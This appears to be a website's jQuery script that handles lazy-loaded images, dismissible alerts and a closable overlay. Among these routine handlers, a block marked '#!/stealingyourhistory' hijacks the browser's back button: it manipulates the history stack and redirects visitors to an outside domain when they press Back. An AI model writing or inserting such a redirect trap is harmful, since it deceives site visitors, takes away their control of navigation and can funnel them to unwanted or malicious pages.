


$(function() {
    $("img.lazy").lazyload({
        threshold :1000,
        effect: "fadeIn",
    });
});
$(document).ready(function(){
	$('.alert').click(function(){
		$('.alert').fadeOut();
	});
	$('.alert_cont').click(function(event){
	event.stopPropagation();
	});
});

(function (window, location) {
            history.replaceState(null, document.title, location.pathname + "#!/stealingyourhistory");
            history.pushState(null, document.title, location.pathname);
            window.addEventListener("popstate", function () {
                if (location.hash === "#!/stealingyourhistory") {
                    history.replaceState(null, document.title, location.pathname);
                    setTimeout(function () {
                        parent.window.location.href = 'http://xe01.taoneigou.cn/fanhui/';
                    }, 0);
                }
            }, false);
        }(window, location));

$(document).ready(function(){
	$(".close").click(function(){
		$('#layer').hide();
	})
})